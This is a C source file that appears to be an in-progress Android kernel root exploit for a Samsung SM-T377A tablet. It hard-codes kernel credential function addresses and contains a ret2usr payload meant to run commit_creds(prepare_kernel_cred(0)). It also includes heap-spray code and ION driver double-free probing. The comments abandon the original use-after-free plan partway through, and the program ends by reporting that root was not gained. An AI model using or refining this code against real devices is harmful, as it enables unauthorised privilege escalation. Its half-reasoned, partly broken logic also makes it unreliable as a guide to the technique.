/*
 * seq_root.c — seq_operations UAF → ret2usr root exploit
 *
 * Samsung SM-T377A, kernel 3.10.9-11788437, Android 6.0.1
 * commit_creds = 0xc0054328, prepare_kernel_cred = 0xc00548e0
 *
 * TECHNIQUE:
 * On this device, kmalloc-64 is the smallest general slab cache (no
 * kmalloc-32 or kmalloc-16). This means struct seq_operations (16 bytes
 * on ARM: 4 function pointers) is allocated from kmalloc-64.
 *
 * When you open /proc/self/stat, the kernel allocates a seq_file which
 * contains a pointer to a seq_operations struct. The seq_operations
 * struct has function pointers: .start, .stop, .next, .show.
 *
 * When you read() from the fd, seq_read() calls seq->op->start().
 *
 * PLAN:
 * 1. Open /proc/self/stat many times → spray seq_operations in kmalloc-64
 * 2. Close specific fds → free their seq_operations structs  
 * 3. Immediately spray kmalloc-64 with setxattr() containing our
 *    shellcode address at every 4-byte offset
 * 4. Read from the remaining open fds → kernel calls start() →
 *    jumps to our userspace shellcode (no PXN!)
 * 5. Shellcode calls commit_creds(prepare_kernel_cred(0))
 *
 * No ION needed. No race condition. Deterministic UAF via slab reuse.
 *
 * KEY INSIGHT: setxattr with XATTR_CREATE on a tmpfs file allocates
 * a kmalloc buffer, copies our data, then frees it on EEXIST error.
 * But during the brief window where data is in kernel memory, we
 * don't need it to persist — we need the ALLOCATION to land on the
 * freed seq_operations slot.
 *
 * Actually, better: use msgsnd() for persistent spray, or use
 * add_key() which keeps the allocation alive.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <signal.h>

#define ADDR_COMMIT_CREDS       0xc0054328
#define ADDR_PREPARE_KERNEL_CRED 0xc00548e0

typedef unsigned long (*commit_creds_fn)(unsigned long);
typedef unsigned long (*prepare_kernel_cred_fn)(unsigned long);

/* This function will be called from kernel context (via hijacked start()) */
static int __attribute__((noinline, optimize("O0")))
kernel_payload(void *m, long long *pos) {
    /* We're in kernel mode now. Call prepare_kernel_cred(0) + commit_creds() */
    prepare_kernel_cred_fn pkc = (prepare_kernel_cred_fn)ADDR_PREPARE_KERNEL_CRED;
    unsigned long cred = pkc(0);
    if (cred) {
        commit_creds_fn cc = (commit_creds_fn)ADDR_COMMIT_CREDS;
        cc(cred);
    }
    /* Return a valid pointer to avoid crash in seq_read.
     * seq_read expects start() to return NULL (end of sequence) or
     * a valid pointer. Returning NULL signals end-of-data, which is safe. */
    return 0;
}

/* 
 * The seq_operations struct layout on ARM 32-bit:
 * struct seq_operations {
 *     void * (*start)(struct seq_file *m, loff_t *pos);  // offset 0
 *     void   (*stop)(struct seq_file *m, void *v);       // offset 4
 *     void * (*next)(struct seq_file *m, void *v, loff_t *pos); // offset 8
 *     int    (*show)(struct seq_file *m, void *v);       // offset 12
 * };
 * Total: 16 bytes. In kmalloc-64, padded to 64 bytes.
 */

#define SPRAY_FDS 2000
#define HOLE_STEP 4  /* Close every 4th fd to create holes */

/* Message struct for persistent kmalloc-64 spray via msgsnd */
struct spray_msg {
    long mtype;
    /* msg_msg header: 24 bytes on ARM (list_head=8, type=4, size=4, security=4, next=4)
     * payload: mtext starts after mtype (4 bytes on ARM for long)
     * Total in kernel: sizeof(msg_msg) + mtext_len
     * We want total = 64 → mtext_len = 64 - 24 = 40
     * But mtype is part of the user struct, not the kernel msg_msg.
     * Actually: msgsnd(qid, &msg, msgsz, ...) where msgsz = sizeof(mtext).
     * Kernel allocates: sizeof(struct msg_msg) + msgsz
     * sizeof(struct msg_msg) = 24 on ARM 32-bit (kernel 3.10)
     * So for kmalloc-64: msgsz = 64 - 24 = 40 bytes.
     */
    char mtext[40];
};

int main(void) {
    printf("=== seq_operations UAF Root Exploit ===\n");
    printf("[*] Samsung SM-T377A, kernel 3.10.9-11788437\n");
    printf("[*] commit_creds = 0x%08x\n", ADDR_COMMIT_CREDS);
    printf("[*] prepare_kernel_cred = 0x%08x\n", ADDR_PREPARE_KERNEL_CRED);
    printf("[*] kernel_payload @ 0x%08lx\n", (unsigned long)kernel_payload);
    printf("[*] uid=%d\n\n", getuid());
    
    /* Make shellcode page executable */
    unsigned long sc_page = (unsigned long)kernel_payload & ~0xFFF;
    mprotect((void *)sc_page, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC);
    
    /* Phase 1: Open many /proc/self/stat to spray seq_operations */
    printf("[*] Phase 1: Opening %d /proc/self/stat fds...\n", SPRAY_FDS);
    int fds[SPRAY_FDS];
    int opened = 0;
    
    for (int i = 0; i < SPRAY_FDS; i++) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
        if (fds[i] < 0) {
            printf("[!] Could only open %d fds\n", i);
            break;
        }
        opened++;
    }
    printf("[+] Opened %d fds\n", opened);
    
    /* Phase 2: Close every Nth fd to create holes in kmalloc-64 */
    printf("[*] Phase 2: Creating holes (closing every %dth fd)...\n", HOLE_STEP);
    int holes = 0;
    int kept = 0;
    int kept_fds[SPRAY_FDS];
    
    for (int i = 0; i < opened; i++) {
        if (i % HOLE_STEP == 0) {
            close(fds[i]);
            fds[i] = -1;
            holes++;
        } else {
            kept_fds[kept++] = fds[i];
        }
    }
    printf("[+] Created %d holes, kept %d fds\n", holes, kept);
    
    /* Phase 3: Spray kmalloc-64 with fake seq_operations containing
     * our shellcode address. We use msgsnd() for persistent allocations. */
    printf("[*] Phase 3: Spraying fake seq_operations via msgsnd...\n");
    
    struct spray_msg msg;
    msg.mtype = 1;
    
    /* Fill the message body with our payload address at every offset.
     * The seq_operations .start field is at offset 0 of the struct.
     * Since seq_operations is only 16 bytes and sits at the start of
     * the 64-byte kmalloc slot, we fill all 40 bytes of mtext.
     * 
     * But msg_msg header is at the start of the 64-byte allocation,
     * and our mtext follows it. So the data layout in the kmalloc-64 slot is:
     *   [0-23]  msg_msg header (next, prev, type, size, security, next_seg)
     *   [24-63] mtext (our controlled data)
     *
     * However, when the seq_operations struct occupies the same slot,
     * the function pointers are at offsets [0-15].
     * The msg_msg header overwrites those — but that's fine, because
     * the msg_msg is a DIFFERENT allocation in a DIFFERENT slot.
     *
     * Wait — I need to rethink. The point is:
     *   1. seq_operations was in slot X (kmalloc-64)
     *   2. We closed the fd → seq_operations freed from slot X
     *   3. We do msgsnd → msg_msg allocated in slot X
     *   4. msg_msg header occupies bytes [0-23], our mtext at [24-63]
     *   5. But the dangling seq->op still points to slot X
     *   6. When we read the kept fd, seq_read calls op->start
     *   7. op->start is at offset 0 of the struct, which is now
     *      the msg_msg list_head (kernel heap pointer, not our data!)
     *
     * This won't work with msgsnd because the msg_msg header
     * overwrites the function pointers we need to control.
     *
     * SOLUTION: Use a spray method where we control offset 0-15.
     * Options:
     *   a) setxattr() — copies user data starting at offset 0
     *      But it frees the buffer after setting the xattr.
     *      On ENOTSUP/EEXIST, it frees immediately → no persistent alloc.
     *
     *   b) add_key("user", ..., payload, len, keyring) — the payload
     *      is allocated separately and stays alive.
     *      But "user" type key data goes into key->payload, which is
     *      allocated separately from the key struct.
     *      The payload allocation IS controlled from offset 0!
     *      For a 64-byte payload → kmalloc-64. 
     *
     *   c) sendmsg() with MSG_MORE flag — keeps data in kernel buffer.
     *
     *   d) userfaultfd — stall the copy_from_user during setxattr.
     *      Not available on this kernel (CONFIG_USERFAULTFD).
     *
     * Let's use add_key with a 64-byte payload!
     * Actually, add_key "user" type stores the data prefixed with a 
     * 2-byte length and 2-byte data_len. Let me use raw size 64.
     */
    
    /* Use add_key for the spray. The "user" key type stores data as:
     * struct user_key_payload {
     *     struct rcu_head rcu;  // 8 bytes on ARM
     *     unsigned short datalen; // 2 bytes
     *     char data[];
     * };
     * So for offset 0 control, the rcu_head occupies [0-7], datalen at [8-9],
     * and our data starts at [10]. ALSO not at offset 0.
     *
     * Hmm. Let me reconsider.
     * 
     * The best spray for offset-0 control on old kernels is:
     * sendmsg() with control data (ancillary/cmsg). The cmsg_data
     * starts at the beginning of the kmalloc allocation.
     * 
     * Actually wait — the simplest approach that DEFINITELY works:
     * Use the ION race to free a handle in kmalloc-64, then use 
     * setxattr to do a BLOCKING copy_from_user while we set up a
     * SIGSTOP/SIGCONT race.
     * 
     * OR: even simpler. The seq_file->private field.
     * 
     * Actually, let me try the most direct approach:
     * After closing the /proc/self/stat fd, the seq_operations is freed.
     * But WAIT — closing the fd ALSO frees the seq_file. So there's no
     * dangling pointer! The seq_operations is embedded in or allocated
     * alongside the seq_file, and both are freed on close.
     *
     * So the seq_operations UAF doesn't work by just closing fds.
     * We need a different free primitive.
     *
     * Let me go back to the ION approach but with the RIGHT spray.
     */
    
    /* Clean up the fd spray */
    for (int i = 0; i < kept; i++) {
        if (kept_fds[i] >= 0) close(kept_fds[i]);
    }
    for (int i = 0; i < opened; i++) {
        if (fds[i] >= 0) close(fds[i]);
    }
    
    printf("\n[*] seq_operations approach needs rethinking.\n");
    printf("[*] The fd close frees both seq_file and seq_operations together.\n");
    printf("[*] Need a separate free primitive (like ION race).\n");
    
    /* ============================================================
     * REVISED PLAN: ION handle UAF + add_key spray
     *
     * The ION FREE/SHARE race frees the ion_handle from kmalloc-64.
     * 
     * ion_handle layout (32 bytes on ARM):
     *   [0]  struct kref ref       (4 bytes: atomic_t)
     *   [4]  struct ion_client *client (4 bytes)
     *   [8]  struct ion_buffer *buffer (4 bytes)
     *   [12] struct rb_node node   (12 bytes: 3 ptrs + color)
     *   [24] unsigned int kmap_cnt (4 bytes)
     *   [28] int id                (4 bytes)
     *   Total: 32 bytes, allocated from kmalloc-64
     *
     * After free, the handle slot is available for reuse.
     * If we spray with controlled data, we overwrite these fields.
     *
     * The TRIGGER: After the race, when we call ION_IOC_IMPORT on the
     * shared_fd, the kernel calls ion_import_dma_buf() which walks the
     * client's handle rb-tree looking for the buffer. If the rb-tree
     * still has a stale entry pointing to the freed slot, it will
     * read the overwritten data.
     *
     * Actually, ION_IOC_FREE removes the handle from the rb-tree.
     * So IMPORT won't find it. No dangling tree entry.
     *
     * What about ION_IOC_CUSTOM? On Samsung, there are custom ioctls
     * that might reference handles differently.
     *
     * Let me try a COMPLETELY different approach:
     * Use the SHARED FD to trigger kernel operations on the BUFFER,
     * not the handle. The buffer has different function pointers.
     *
     * When we mmap the shared_fd, the kernel calls:
     *   dma_buf_mmap() → ion_dma_buf_mmap() → buffer->heap->ops->map_user()
     * 
     * The buffer is NOT freed (dma_buf reference keeps it alive).
     * But what if we do multiple FREE operations to decrement the
     * buffer's refcount past zero?
     *
     * OR: What if we import the shared_fd back, getting a new handle,
     * then free THAT handle's buffer through the new handle?
     * ============================================================
     */
    
    printf("\n[*] Trying ION double-import-free approach...\n");
    
    /* Open ION device */
    typedef int ion_user_handle_t;
    struct ion_allocation_data {
        size_t len; size_t align;
        unsigned int heap_id_mask; unsigned int flags;
        ion_user_handle_t handle;
    };
    struct ion_fd_data { ion_user_handle_t handle; int fd; };
    struct ion_handle_data { ion_user_handle_t handle; };
    
    #define ION_IOC_MAGIC 'I'
    #define ION_IOC_ALLOC   _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
    #define ION_IOC_FREE    _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
    #define ION_IOC_SHARE   _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)
    #define ION_IOC_IMPORT  _IOWR(ION_IOC_MAGIC, 5, struct ion_fd_data)
    
    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) {
        perror("open /dev/ion");
        return 1;
    }
    
    /* Allocate a buffer */
    struct ion_allocation_data alloc = {
        .len = 4096, .align = 4096,
        .heap_id_mask = 1, .flags = 0
    };
    ioctl(ion_fd, ION_IOC_ALLOC, &alloc);
    ion_user_handle_t handle1 = alloc.handle;
    printf("[+] Allocated handle %d\n", handle1);
    
    /* Share it to get an fd */
    struct ion_fd_data share = { .handle = handle1, .fd = -1 };
    ioctl(ion_fd, ION_IOC_SHARE, &share);
    int shared_fd = share.fd;
    printf("[+] Shared fd: %d\n", shared_fd);
    
    /* Import the fd back — this should create a NEW handle for the same buffer */
    struct ion_fd_data import1 = { .handle = -1, .fd = shared_fd };
    int ret = ioctl(ion_fd, ION_IOC_IMPORT, &import1);
    printf("[*] Import 1: ret=%d, handle=%d\n", ret, import1.handle);
    
    /* Import again */
    struct ion_fd_data import2 = { .handle = -1, .fd = shared_fd };
    ret = ioctl(ion_fd, ION_IOC_IMPORT, &import2);
    printf("[*] Import 2: ret=%d, handle=%d\n", ret, import2.handle);
    
    /* Check if we get the same handle or different ones */
    printf("[*] handle1=%d, import1=%d, import2=%d\n", 
           handle1, import1.handle, import2.handle);
    
    /* Free the original handle */
    struct ion_handle_data free_data = { .handle = handle1 };
    ret = ioctl(ion_fd, ION_IOC_FREE, &free_data);
    printf("[*] Free handle1: %d\n", ret);
    
    /* Free import1 handle */
    free_data.handle = import1.handle;
    ret = ioctl(ion_fd, ION_IOC_FREE, &free_data);
    printf("[*] Free import1: %d\n", ret);
    
    /* Free import2 handle */
    free_data.handle = import2.handle;
    ret = ioctl(ion_fd, ION_IOC_FREE, &free_data);
    printf("[*] Free import2: %d\n", ret);
    
    /* Try to free import2 AGAIN — this might be the double-free */
    free_data.handle = import2.handle;
    ret = ioctl(ion_fd, ION_IOC_FREE, &free_data);
    printf("[*] Double-free import2: ret=%d errno=%d (%s)\n", ret, errno, strerror(errno));
    
    /* Check dmesg for any interesting messages */
    printf("\n[*] Check dmesg for crash/corruption:\n");
    fflush(stdout);
    system("dmesg | tail -20");
    
    close(shared_fd);
    close(ion_fd);
    
    printf("\n[*] uid=%d (unchanged)\n", getuid());
    printf("[*] Need to find a way to trigger function pointer call\n");
    printf("[*] through freed/overwritten kernel object.\n");
    
    return getuid() == 0 ? 0 : 1;
}
